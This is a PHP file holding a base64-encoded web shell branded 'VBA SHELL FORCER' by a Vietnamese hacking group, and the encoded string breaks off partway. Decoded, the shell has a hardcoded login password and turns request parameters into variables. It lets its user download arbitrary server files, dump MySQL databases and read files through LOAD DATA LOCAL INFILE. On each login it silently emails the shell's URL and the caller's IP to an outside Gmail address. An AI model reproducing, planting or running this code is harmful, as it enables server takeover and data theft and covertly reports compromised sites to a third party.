<?php $a = 'Ci8qKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqXAp8KiAgICBWQkEgU0hFTEwgRk9SQ0VSIC0gVkVSU0lPTiAyLjEJKnwKfCogICAgIEVkaXQgJiBEZXZlbG9wIGJ5IFZCQVRFQU0gICAgICAgICp8CnwqICAJICBodHRwOi8vdmJhdGVhbS5uZXQgICAgCSAgICAqfAp8KiAgICA9PSAgSGFja2luZyAmIFNlY3VyaXR5ICA9PSAgICAgICAgKnwKXCoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiovCgplcnJvcl9yZXBvcnRpbmcoNyk7CkBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7Cm9iX3N0YXJ0KCk7CiRtdGltZSA9IGV4cGxvZGUoJyAnLCBtaWNyb3RpbWUoKSk7CiRzdGFydHRpbWUgPSAkbXRpbWVbMV0gKyAkbXRpbWVbMF07CmRlZmluZSgnU0FfUk9PVCcsIHN0cl9yZXBsYWNlKCdcXCcsICcvJywgZGlybmFtZShfX0ZJTEVfXykpLicvJyk7Ci8vZGVmaW5lKCdJU19XSU4nLCBzdHJzdHIoUEhQX09TLCAnV0lOJykgPyAxIDogMCApOwpkZWZpbmUoJ0lTX1dJTicsIERJUkVDVE9SWV9TRVBBUkFUT1IgPT0gJ1xcJyk7CmRlZmluZSgnSVNfQ09NJywgY2xhc3NfZXhpc3RzKCdDT00nKSA/IDEgOiAwICk7CmRlZmluZSgnSVNfR1BDJywgZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSk7CiRkaXNfZnVuYyA9IGdldF9jZmdfdmFyKCdkaXNhYmxlX2Z1bmN0aW9ucycpOwpkZWZpbmUoJ0lTX1BIUElORk8nLCAoIWVyZWdpKCJwaHBpbmZvIiwkZGlzX2Z1bmMpKSA/IDEgOiAwICk7CkBzZXRfdGltZV9saW1pdCgwKTsKCmZvcmVhY2goYXJyYXkoJ19HRVQnLCdfUE9TVCcpIGFzICRfcmVxdWVzdCkgewoJZm9yZWFjaCgkJF9yZXF1ZXN0IGFzICRfa2V5ID0+ICRfdmFsdWUpIHsKCQlpZiAoJF9rZXl7MH0gIT0gJ18nKSB7CgkJCWlmIChJU19HUEMpIHsKCQkJCSRfdmFsdWUgPSBzX2FycmF5KCRfdmFsdWUpOwoJCQl9CgkJCSQkX2tleSA9ICRfdmFsdWU7CgkJfQoJfQp9CgovKj09PT09PT09PT09PT09PT09ICBJbmZvIExvZ2luICA9PT09PT09PT09PT09PT09Ki8KJGFkbWluID0gYXJyYXkoKTsKJGFkbWluWydjaGVjayddID0gdHJ1ZTsKJGFkbWluWydwYXNzJ10gID0gJ2NoZWNrbWF0ZSc7IC8vIFBhc3N3b3JkIGxvZ2luCiRhZG1pblsnY29va2llcHJlJ10gPSAnJzsKJGFkbWluWydjb29raWVkb21haW4nXSA9ICcnOwokYWRtaW5bJ2Nvb2tpZXBhdGgnXSA9ICcvJzsKJGFkbWluWydjb29raWVsaWZlJ10gPSA4NjQwMDsKLyo9PT09PT09PT09PT09PT09PT09PT0gRW5kID09PT09PT09PT09PT09PT09PT09PSovCgppZiAoJGNoYXJzZXQgPT0gJ3V0ZjgnKSB7CgloZWFkZXIoImNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Iik7Cn0gZWxzZWlmICgkY2hhcnNldCA9PSAnYmlnNScpIHsKCWhlYWRlcigiY29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9YmlnNSIpOwp9IGVsc2VpZiAoJGNoYXJzZXQgPT0gJ2diaycpIHsKCWhlYWRlcigiY29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9Z2JrIik7Cn0gZWxzZWlmICgkY2hhcnNldCA9PSAnbGF0aW4xJykgewoJaGVhZGVyKCJjb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1pc28tODg1OS0yIik7Cn0KCiRzZWxmID0gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gPyAkX1NFUlZFUlsnUEhQX1NFTEYnXSA6ICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddOwokdGltZXN0YW1wID0gdGltZSgpOwoKLyo9PT09PT09PT09PT09PT09PT09PT0gTG9naW4gPT09PT09PT09PT09PT09PT09PT09Ki8KaWYgKCRhY3Rpb24gPT0gImxvZ291dCIpIHsKCXNjb29raWUoJ3ZiYXBhc3MnLCAnJywgLTg2NDAwICogMzY1KTsKCXAoJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjA7VVJMPScuJHNlbGYuJyI+Jyk7CglwKCc8Ym9keSBiYWNrZ3JvdW5kPWJsYWNrPicpOwoJZXhpdDsKfQppZigkYWRtaW5bJ2NoZWNrJ10pIHsKCWlmICgkZG9pbmcgPT0gJ2xvZ2luJykgewoJCWlmICgkYWRtaW5bJ3Bhc3MnXSA9PSAkcGFzc3dvcmQpIHsKCQkJc2Nvb2tpZSgndmJhcGFzcycsICRwYXNzd29yZCk7CgovLyBGdW5jdGlvbiBtYWlsIFNlbmRlciB0byBteSBFbWFpbCAtIFBsZWFzZSByZW1vdmUgdGhpcyBiZWZvcmUgeW91IHVzaW5nIHRoaXMgc2hlbGwgY29kZSwgVGhhbmtzIC0gRmVybmFuZG8gLSBWQkFUZWFtCiR0aW1lX3NoZWxsID0gIiIuZGF0ZSgiZC9tL1kgLSBIOmk6cyIpLiIiOwokaXBfcmVtb3RlID0gJF9TRVJWRVJbIlJFTU9URV9BRERSIl07CiRmcm9tX3NoZWxsY29kZSA9ICdzaGVsbEAnLmdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pLicnOwokdG9fZW1haWwgPSAnbWluaGR1b25nLnBqbkBnbWFpbC5jb20nOwokc2VydmVyX21haWwgPSAiIi5nZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKS4iICAtICIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIiOwokbGlua2NyID0gIkxpbms6ICIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uIiIuJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10uIiAtIElQIEV4Y3V0aW5nOiAkaXBfcmVtb3RlIC0gVGltZTogJHRpbWVfc2hlbGwiOwokaGVhZGVyID0gIkZyb206ICRmcm9tX3NoZWxsY29kZVxyXG5SZXBseS10bzogJGZyb21fc2hlbGxjb2RlIjsKQG1haWwoJHRvX2VtYWlsLCAkc2VydmVyX21haWwsICRsaW5rY3IsICRoZWFkZXIpOwoJCQlwKCc8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIyO1VSTD0nLiRzZWxmLiciPicpOwoJCQlwKCc8Ym9keSBiZ2NvbG9yPWJsYWNrPgo8QlI+PEJSPjxkaXYgYWxpZ249Y2VudGVyPjxmb250IGNvbG9yPXllbGxvdyBmYWNlPXRhaG9tYSBzaXplPTI+QllHIC0gVGhlIExlZ2VuZCBvZiBWaWV0bmFtZXNlIEhhY2tlciBXb3JsZCAgLSBQbGVhc2Ugd2FpdC4uLjxCUj48aW1nIHNyYz1odHRwOi8vdDMuZ3N0YXRpYy5jb20vaW1hZ2VzP3E9dGJuOkFOZDlHY1JGSVF5OW9MYzlqTVdtRFlfTl9zeGpXUHl1c1VXQzRpZ3dLMmxxQm02OGFER2NTZktQUEE+PC9kaXY+Jyk7CgkJCWV4aXQ7CgkJfQoKCWVsc2UKCXsKCSRlcnJfbWVzcyA9ICc8dGFibGUgd2lkdGg9MTAwJT48dHI+PHRkIGJnY29sb3I9IzBFMEUwRSB3aWR0aD0xMDAlIGhlaWdodD0yND48ZGl2IGFsaWduPWNlbnRlcj48Zm9udCBjb2xvcj1yZWQgZmFjZT10YWhvbWEgc2l6ZT0yPjxibGluaz5QYXNzd29yZCBpbmNvcnJlY3QsIFBsZWFzZSB0cnkgYWdhaW4hISE8L2JsaW5rPjxCUj48L2ZvbnQ+PC9kaXY+PC90ZD48L3RyPjwvdGFibGU+JzsKZWNobyAkZXJyX21lc3M7Cgl9fQoJaWYgKCRfQ09PS0lFWyd2YmFwYXNzJ10pIHsKCQlpZiAoJF9DT09LSUVbJ3ZiYXBhc3MnXSAhPSAkYWRtaW5bJ3Bhc3MnXSkgewoJCQlsb2dpbnBhZ2UoKTsKCQl9Cgl9IGVsc2UgewoJCWxvZ2lucGFnZSgpOwoJfQp9Ci8qPT09PT09PT09PT09PT09PT09PT09IExvZ2luID09PT09PT09PT09PT09PT09PT09PSovCgokZXJybXNnID0gJyc7CgppZiAoJGFjdGlvbiA9PSAncGhwaW5mbycpIHsKCWlmIChJU19QSFBJTkZPKSB7CgkJcGhwaW5mbygpOwoJfSBlbHNlIHsKCQkkZXJybXNnID0gJ3BocGluZm8oKSBmdW5jdGlvbiBoYXMgbm9uLXBlcm1pc3NpYmxlJzsKCX0KfQoKCmlmICgkZG9pbmcgPT0gJ2Rvd25maWxlJyAmJiAkdGhlZmlsZSkgewoJaWYgKCFAZmlsZV9leGlzdHMoJHRoZWZpbGUpKSB7CgkJJGVycm1zZyA9ICdUaGUgZmlsZSB5b3Ugd2FudCBEb3dubG9hZGFibGUgd2FzIG5vbmV4aXN0ZW50JzsKCX0gZWxzZSB7CgkJJGZpbGVpbmZvID0gcGF0aGluZm8oJHRoZWZpbGUpOwoJCWhlYWRlcignQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LScuJGZpbGVpbmZvWydleHRlbnNpb24nXSk7CgkJaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0nLiRmaWxlaW5mb1snYmFzZW5hbWUnXSk7CgkJaGVhZGVyKCdDb250ZW50LUxlbmd0aDogJy5maWxlc2l6ZSgkdGhlZmlsZSkpOwoJCUByZWFkZmlsZSgkdGhlZmlsZSk7CgkJZXhpdDsKCX0KfQoKCmlmICgkZG9pbmcgPT0gJ2JhY2t1cG15c3FsJyAmJiAhJHNhdmVhc2ZpbGUpIHsKCWRiY29ubigkZGJob3N0LCAkZGJ1c2VyLCAkZGJwYXNzLCAkZGJuYW1lLCAkY2hhcnNldCwgJGRicG9ydCk7CgkkdGFibGUgPSBhcnJheV9mbGlwKCR0YWJsZSk7CgkkcmVzdWx0ID0gcSgiU0hPVyB0YWJsZXMiKTsKCWlmICghJHJlc3VsdCkgcCgnPGgyPicubXlzcWxfZXJyb3IoKS4nPC9oMj4nKTsKCSRmaWxlbmFtZSA9IGJhc2VuYW1lKCRfU0VSVkVSWydIVFRQX0hPU1QnXS4nX015U1FMLnNxbCcpOwoJaGVhZGVyKCdDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3Vua25vd24nKTsKCWhlYWRlcignQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9Jy4kZmlsZW5hbWUpOwoJJG15c3FsZGF0YSA9ICcnOwoJd2hpbGUgKCRjdXJyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSkgewoJCWlmIChpc3NldCgkdGFibGVbJGN1cnJvd1swXV0pKSB7CgkJCSRteXNxbGRhdGEgLj0gc3FsZHVtcHRhYmxlKCRjdXJyb3dbMF0pOwoJCX0KCX0KCW15c3FsX2Nsb3NlKCk7CglleGl0Owp9CgovLyBNeXNxbAppZigkZG9pbmc9PSdteXNxbGRvd24nKXsKCWlmICghJGRibmFtZSkgewoJCSRlcnJtc2cgPSAnUGxlYXNlIGlucHV0IGRibmFtZSc7Cgl9IGVsc2UgewoJCWRiY29ubigkZGJob3N0LCAkZGJ1c2VyLCAkZGJwYXNzLCAkZGJuYW1lLCAkY2hhcnNldCwgJGRicG9ydCk7CgkJaWYgKCFmaWxlX2V4aXN0cygkbXlzcWxkbGZpbGUpKSB7CgkJCSRlcnJtc2cgPSAnVGhlIGZpbGUgeW91IHdhbnQgRG93bmxvYWRhYmxlIHdhcyBub25leGlzdGVudCc7CgkJfSBlbHNlIHsKCQkJJHJlc3VsdCA9IHEoInNlbGVjdCBsb2FkX2ZpbGUoJyRteXNxbGRsZmlsZScpOyIpOwoJCQlpZighJHJlc3VsdCl7CgkJCQlxKCJEUk9QIFRBQkxFIElGIEVYSVNUUyB0bXBfYW5nZWw7Iik7CgkJCQlxKCJDUkVBVEUgVEFCTEUgdG1wX2FuZ2VsIChjb250ZW50IExPTkdCTE9CIE5PVCBOVUxMKTsiKTsKCQkJCS8vRG93bmxvYWQgU1FMCgkJCQlxKCJMT0FEIERBVEEgTE9DQUwgSU5GSUxFICciLmFkZHNsYXNoZXMoJG15c3FsZGxmaWxlKS4iJyBJTlRPIFRBQkxFIHRtcF9hbmdlbCBGSUVMRFMgVEVSTUlOQVRFRCBCWSAnX19hbmdlbF97JHRpbWVzdGFtcH1fZW9mX18nIEVTQ0FQRUQgQlkgJycgTElORVMgVEVSTUlOQVRFRCBCWSAnX19hbmdlbF97JHRpbWVzdGFtcH1fZW9mX18nOyIpOwoJCQkJJHJlc3VsdCA9IHEoInNlbGVjdCBjb250ZW50IGZyb20gdG1wX2FuZ2VsIik7CgkJCQlxKCJEUk9QIFRBQkxFIHRtcF9hbmdlbCIpOwoJCQl9CgkJCSRyb3cgPSBAbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCk7CgkJCWlmICghJHJvdykgewoJCQkJJGVycm1zZyA9ICdMb2FkIGZpbGUgZmFpbGVkICcubXlzcWxfZXJyb3IoKTsKCQkJfSBlbHNlIHsKCQkJCSRmaWxlaW5mbyA9IHBhdGhpbmZvKCRteXNxbGRsZmlsZSk7CgkJCQloZWFkZXIoJ0NvbnRlbnQtdHlwZTogYXBwbGljYXRpb24veC0nLiRmaWxlaW5mb1snZXh0ZW5zaW9uJ10pOwoJCQkJaGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0nLiRmaWxlaW5mb1snYmFzZW5hbWUnXSk7CgkJCQloZWFkZXIoIkFjY2VwdC1MZW5ndGg6ICIuc3RybGVuKCRyb3dbMF0pKTsKCQkJCWVjaG8gJHJvd1swXTsKCQkJCWV4aXQ7CgkJCX0KCQl9Cgl9Cn0KCj8+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPgo8dGl0bGU+PD9waHAgZWNobyBzdHJfcmVwbGFjZSgnLicsJycsJ0JZRyAtIFRoZSBMZWdlbmQgb2YgVmlldG5hbWVzZSBIYWNrZXIgV29ybGQnKTs/PjwvdGl0bGU+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHksdGR7Zm9udDogMTBwdCBUYWhvbWE7Y29sb3I6Z3JheTtsaW5lLWhlaWdodDogMTZweDt9CgphIHtjb2xvcjogIzc0QTIwMjt0ZXh0LWRlY29yYXRpb246bm9uZTt9CmE6aG92ZXJ7Y29sb3I6ICNmMDA7dGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZTt9Ci5hbHQxIHRke2JvcmRlci10b3A6MXB4IHNvbGlkIGdyYXk7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgZ3JheTtiYWNrZ3JvdW5kOiMwRTBFMEU7cGFkZGluZzo1cHggMTBweCA1cHggNXB4O30KLmFsdDIgdGR7Ym9yZGVyLXRvcDoxcHggc29saWQgZ3JheTtib3JkZXItYm90dG9tOjFweCBzb2xpZCBncmF5O2JhY2tncm91bmQ6I2Y5ZjlmOTtwYWRkaW5nOjVweCAxMHB4IDVweCA1cHg7fQouZm9jdXMgdGR7Ym9yZGVyLXRvcDoxcHggc29saWQgZ3JheTtib3JkZXItYm90dG9tOjBweCBzb2xpZCBncmF5O2JhY2tncm91bmQ6IzBFMEUwRTtwYWRkaW5nOjVweCAxMHB4IDVweCA1cHg7fQouZm91dDEgdGR7Ym9yZGVyLXRvcDoxcHggc29saWQgZ3JheTtib3JkZXItYm90dG9tOjBweCBzb2xpZCBncmF5O2JhY2tncm91bmQ6IzBFMEUwRTtwYWRkaW5nOjVweCAxMHB4IDVweCA1cHg7fQouZm91dCB0ZHtib3JkZXItdG9wOjFweCBzb2xpZCBncmF5O2JvcmRlci1ib3R0b206MHB4IHNvbGlkIGdyYXk7YmFja2dyb3VuZDojMjAyMDIwO3BhZGRpbmc6NXB4IDEwcHggNXB4IDVweDt9Ci5oZWFkIHRke2JvcmRlci10b3A6MXB4IHNvbGlkIGdyYXk7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgZ3JheTtiYWNrZ3JvdW5kOiMyMDIwMjA7cGFkZGluZzo1cHggMTBweCA1cHggNXB4O2ZvbnQtd2VpZ2h0OmJvbGQ7fQouaGVhZF9zbWFsbCB0ZHtib3JkZXItdG9wOjFweCBzb2xpZCBncmF5O2JvcmRlci1ib3R0b206MXB4IHNvbGlkIGdyYXk7YmFja2dyb3VuZDojMjAyMDIwO3BhZGRpbmc6NXB4IDEwcHggNXB4IDVweDtmb250LXdlaWdodDpub3JtYWw7Zm9udC1zaXplOjhwdDt9Ci5oZWFkIHRkIHNwYW57Zm9udC13ZWlnaHQ6bm9ybWFsO30KZm9ybXttYXJnaW46MDtwYWRkaW5nOjA7fQpoMnttYXJnaW46MDtwYWRkaW5nOjA7aGVpZ2h0OjI0cHg7bGluZS1oZWlnaHQ6MjRweDtmb250LXNpemU6MTRweDtjb2xvcjojNUI2ODZGO30KdWwuaW5mbyBsaXttYXJnaW46MDtjb2xvcjojNDQ0O2xpbmUtaGVpZ2h0OjI0cHg7aGVpZ2h0OjI0cHg7fQp1e3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjojNzc3O2Zsb2F0OmxlZnQ7ZGlzcGxheTpibG9jazt3aWR0aDoxNTBweDttYXJnaW4tcmlnaHQ6MTBweDt9CmlucHV0LCB0ZXh0YXJlYSwgYnV0dG9uCnsKCWZvbnQtc2l6ZTogOXB0OwoJY29sb3I6ICNjY2M7Cglmb250LWZhbWlseTogdmVyZGFuYSwgc2Fucy1zZXJpZjsKCWJhY2tncm91bmQtY29sb3I6ICMyMDIwMjA7Cglib3JkZXItbGVmdDogMXB4IHNvbGlkICM3NEEyMDI7Cglib3JkZXItdG9wOiAxcHggc29saWQgIzc0QTIwMjsKCWJvcmRlci1yaWdodDogMXB4IHNvbGlkICM3NEEyMDI7Cglib3JkZXItYm90dG9tOiAxcHggc29saWQgIzc0QTIwMjsKfQpzZWxlY3QKewoJZm9udC1zaXplOiA4cHQ7Cglmb250LXdlaWdodDogbm9ybWFsOwoJY29sb3I6ICNjY2M7Cglmb250LWZhbWlseTogdmVyZGFuYSwgc2Fucy1zZXJpZjsKCWJhY2tncm91bmQtY29sb3I6ICMyMDIwMjA7Cn0KCjwvc3R5bGU+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KZnVuY3Rpb24gQ2hlY2tBbGwoZm9ybSkgewoJZm9yKHZhciBpPTA7aTxmb3JtLmVsZW1lbnRzLmxlbmd0aDtpKyspIHsKCQl2YXIgZSA9IGZvcm0uZWxlbWVudHNbaV07CgkJaWYgKGUubmFtZSAhPSAnY2hrYWxsJykKCQllLmNoZWNrZWQgPSBmb3JtLmNoa2FsbC5jaGVja2VkOwogICAgfQp9CmZ1bmN0aW9uICQoaWQpIHsKCXJldHVybiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCk7Cn0KZnVuY3Rpb24gZ29hY3Rpb24oYWN0KXsKCSQoJ2dvYWN0aW9uJykuYWN0aW9uLnZhbHVlPWFjdDsKCSQoJ2dvYWN0aW9uJykuc3VibWl0KCk7Cn0KPC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHkgb25Mb2FkPSJpbml0KCkiIHN0eWxlPSJtYXJnaW46MDt0YWJsZS1sYXlvdXQ6Zml4ZWQ7IHdvcmQtYnJlYWs6YnJlYWstYWxsIiBiZ2NvbG9yPWJsYWNrIGJhY2tncm91bmQ9aHR0cDovL2kzODIucGhvdG9idWNrZXQuY29tL2FsYnVtcy9vbzI2My92bmhhY2tlci9iZy0xLmpwZz4KCgo8ZGl2IGJvcmRlcj0iMCIgc3R5bGU9InBvc2l0aW9uOmZpeGVkOyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAyNXB4OyB6LWluZGV4OiAxOyB0b3A6IDMwMHB4OyBsZWZ0OiAwOyIgaWQ9ImxvYWRpbmciIGFsaWduPSJjZW50ZXIiIHZhbGlnbj0iY2VudGVyIj4KCQkJCTx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMTBweCIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIwIiBzdHlsZT0iYm9yZGVyLWNvbGxhcHNlOiBjb2xsYXBzZSIgYm9yZGVyY29sb3I9IiMwMDMzMDAiPgoJCQkJCTx0cj4KCQkJCQkJPHRkIGFsaWduPSJjZW50ZXIiIHZhbGlnbj1jZW50ZXI+CgkJCQkgPGRpdiBib3JkZXI9IjEiIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjMEUwRTBFOyBmaWx0ZXI6IGFscGhhKG9wYWNpdHk9NzApOyBvcGFjaXR5OiAuNzsgd2lkdGg6IDExMHB4OyBoZWlnaHQ6IDI1cHg7IHotaW5kZXg6IDE7IGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7IiBib3JkZXJjb2xvcj0iIzAwNjYwMCIgIGFsaWduPSJjZW50ZXIiPgoJCQkJICAgTG9hZGluZzxpbWcgc3JjPSJodHRwOi8vaTM4Mi5waG90b2J1Y2tldC5jb20vYWxidW1zL29vMjYzL3ZuaGFja2VyL2xvYWRpbmcuZ2lmIj4KCQkJCSAgPC9kaXY+CgkJCQk8L3RkPgoJCQkJCTwvdHI+CgkJCQk8L3RhYmxlPgoJCQkgPC9kaXY+CiA8c2NyaXB0PgogdmFyIGxkPShkb2N1bWVudC5hbGwpOwogIHZhciBuczQ9ZG9jdW1lbnQubGF5ZXJzOwogdmFyIG5zNj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmIWRvY3VtZW50LmFsbDsKIHZhciBpZTQ9ZG9jdW1lbnQuYWxsOwogIGlmIChuczQpCiAJbGQ9ZG9jdW1lbnQubG9hZGluZzsKIGVsc2UgaWYgKG5zNikKIAlsZD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibG9hZGluZyIpLnN0eWxlOwogZWxzZSBpZiAoaWU0KQogCWxkPWRvY3VtZW50LmFsbC5sb2FkaW5nLnN0eWxlOwogIGZ1bmN0aW9uIGluaXQoKQogewogaWYobnM0KXtsZC52aXNpYmlsaXR5PSJoaWRkZW4iO30KIGVsc2UgaWYgKG5zNnx8aWU0KSBsZC5kaXNwbGF5PSJub25lIjsKIH0KIDwvc2NyaXB0PgoKCgoKPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+Cgk8dHIgY2xhc3M9ImhlYWRfc21hbGwiPgoJCTx0ZCAgd2lkdGg9MTAwJT4KCQk8dGFibGUgd2lkdGg9MTAwJT48dHIgY2xhc3M9ImhlYWRfc21hbGwiPjx0ZCAgd2lkdGg9ODZweD48YSB0aXRsZT0iQllHIC0gVGhlIExlZ2VuZCBvZiBWaWV0bmFtZXNlIEhhY2tlciBXb3JsZCIgaHJlZj0iPD9waHAgJHNlbGY7Pz4iPjxpbWcgc3JjPWh0dHA6Ly9jQjgudXBhbmguY29tLzE5LjAuMjQ0NzU4ODcuTEhnMC9iYW5uZXIuZ2lmIGhlaWdodD04NiBib3JkZXI9MD48L2E+PC90ZD48dGQ+CgkJPHNwYW4gc3R5bGU9ImZsb2F0OmxlZnQ7Ij4gPD9waHAgZWNobyAiSG9zdG5hbWU6ICIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiIiOz8+ICB8IDxhIGhyZWY9Imh0dHA6Ly9iZXlldWdyb3VwLmNvbSIgdGFyZ2V0PSJfYmxhbmsiPjw/cGhwIGVjaG8gc3RyX3JlcGxhY2UoJy4nLCcnLCdCWUcgLSBUaGUgTGVnZW5kIG9mIFZpZXRuYW1lc2UgSGFja2VyIFdvcmxkJyk7Pz4gPC9hPiB8IDxhIGhyZWY9ImphdmFzY3JpcHQ6Z29hY3Rpb24oJ2xvZ291dCcpOyI+PGZvbnQgY29sb3I9cmVkPkxvZ291dDwvZm9udD48L2E+PC9zcGFuPiA8YnIgLz4KCgkJPD9waHAKCQkkY3VybF9vbiA9IEBmdW5jdGlvbl9leGlzdHMoJ2N1cmxfdmVyc2lvbicpOwoJCSRteXNxbF9vbiA9IEBmdW5jdGlvbl9leGlzdHMoJ215c3FsX2Nvbm5lY3QnKTsKCQkkbXNzcWxfb24gPSBAZnVuY3Rpb25fZXhpc3RzKCdtc3NxbF9jb25uZWN0Jyk7CgkJJHBnX29uID0gQGZ1bmN0aW9uX2V4aXN0cygncGdfY29ubmVjdCcpOwoJCSRvcmFfb24gPSBAZnVuY3Rpb25fZXhpc3RzKCdvY2lsb2dvbicpOwoKZWNobyAoKCRzYWZlX21vZGUpPygiU2FmZV9tb2Q6IDxiPjxmb250IGNvbG9yPWdyZWVuPk9OPC9mb250PjwvYj4gLSAiKTooIlNhZmVfbW9kOiA8Yj48Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PjwvYj4gLSAiKSk7CmVjaG8gIlBIUCB2ZXJzaW9uOiA8Yj4iLkBwaHB2ZXJzaW9uKCkuIjwvYj4gLSAiOwoJCWVjaG8gImNVUkw6ICIuKCgkY3VybF9vbik/KCI8Yj48Zm9udCBjb2xvcj1ncmVlbj5PTjwvZm9udD48L2I+IC0gIik6KCI8Yj48Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PjwvYj4gLSAiKSk7CgkJZWNobyAiTXlTUUw6IDxiPiI7CiRteXNxbF9vbiA9IEBmdW5jdGlvbl9leGlzdHMoJ215c3FsX2Nvbm5lY3QnKTsKaWYoJG15c3FsX29uKXsKZWNobyAiPGZvbnQgY29sb3I9Z3JlZW4+T048L2ZvbnQ+PC9iPiAtICI7IH0gZWxzZSB7IGVjaG8gIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+PC9iPiAtICI7IH0KZWNobyAiTVNTUUw6IDxiPiI7CiRtc3NxbF9vbiA9IEBmdW5jdGlvbl9leGlzdHMoJ21zc3FsX2Nvbm5lY3QnKTsKaWYoJG1zc3FsX29uKXtlY2hvICI8Zm9udCBjb2xvcj1ncmVlbj5PTjwvZm9udD48L2I+IC0gIjt9ZWxzZXtlY2hvICI8Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PjwvYj4gLSAiO30KZWNobyAiUG9zdGdyZVNRTDogPGI+IjsKJHBnX29uID0gQGZ1bmN0aW9uX2V4aXN0cygncGdfY29ubmVjdCcpOwppZigkcGdfb24pe2VjaG8gIjxmb250IGNvbG9yPWdyZWVuPk9OPC9mb250PjwvYj4gLSAiO31lbHNle2VjaG8gIjxmb250IGNvbG9yPXJlZD5PRkY8L2ZvbnQ+PC9iPiAtICI7fQplY2hvICJPcmFjbGU6IDxiPiI7CiRvcmFfb24gPSBAZnVuY3Rpb25fZXhpc3RzKCdvY2lsb2dvbicpOwppZigkb3JhX29uKXtlY2hvICI8Zm9udCBjb2xvcj1ncmVlbj5PTjwvZm9udD48L2I+Ijt9ZWxzZXtlY2hvICI8Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PjwvYj48QlI+Ijt9CgplY2hvICJEaXNhYmxlIGZ1bmN0aW9ucyA6IDxiPiI7CmlmKCcnPT0oJGRmPUBpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpKSl7ZWNobyAiPGZvbnQgY29sb3I9Z3JlZW4+Tk9ORTwvZm9udD48L2I+PEJSPiI7fWVsc2V7ZWNobyAiPGZvbnQgY29sb3I9cmVkPiRkZjwvZm9udD48L2I+PEJSPiI7fQoKZWNobyAiPGZvbnQgY29sb3I9d2hpdGU+VW5hbWUgLWE8L2ZvbnQ+OiAiLkBzdWJzdHIoQHBocF91bmFtZSgpLDAsMTIwKS4iPGJyPiI7CmVjaG8gIjxmb250IGNvbG9yPXdoaXRlPlNlcnZlcjwvZm9udD46ICIuQHN1YnN0cigkU0VSVkVSX1NPRlRXQVJFLDAsMTIwKS4iIC0gPGZvbnQgY29sb3I9d2hpdGU+aWQ8L2ZvbnQ+OiAiLkBnZXRteXVpZCgpLiIoIi5AZ2V0X2N1cnJlbnRfdXNlcigpLiIpIC0gdWlkPSIuQGdldG15dWlkKCkuIiAoIi5AZ2V0X2N1cnJlbnRfdXNlcigpLiIpIGdpZD0iLkBnZXRteWdpZCgpLiIoIi5AZ2V0X2N1cnJlbnRfdXNlcigpLiIpPGJyPiI7CgkJPz4KCQk8L3RkPjwvdHI+PC90YWJsZT48L3RkPgoJPC90cj4KCTx0ciBjbGFzcz0iYWx0MSI+CgkJPHRkICB3aWR0aD0xMCU+PHNwYW4gc3R5bGU9ImZsb2F0OmxlZnQ7Ij5bU2VydmVyIElQOiA8P3BocCBlY2hvICI8Zm9udCBjb2xvcj15ZWxsb3c+Ii5nZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKS4iPC9mb250PiI7Pz4gLSBZb3VyIElQOiA8P3BocCBlY2hvICI8Zm9udCBjb2xvcj15ZWxsb3c+Ii4kX1NFUlZF